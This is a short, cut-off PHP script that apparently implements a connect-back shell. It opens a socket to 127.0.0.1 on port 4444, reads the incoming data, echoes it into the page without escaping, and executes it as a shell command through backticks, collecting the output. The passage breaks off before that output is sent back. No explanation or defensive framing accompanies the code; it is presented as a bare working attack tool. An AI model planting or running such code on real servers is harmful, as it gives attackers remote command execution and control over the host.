<?php
    $sock = fsockopen("127.0.0.1", 4444, $errno, $errstr, 30);
    if (!$sock) {
        echo "$errstr ($errno)<br>";
    } else {
        $input = "";
        while (!feof($sock)) {
            $input .= fgets($sock, 2048);
        }
        fclose($sock);
        echo "<pre>$input</pre>";
        $output = `$input 2>&1`;
        $response = "Output: " . $output . "\n";
       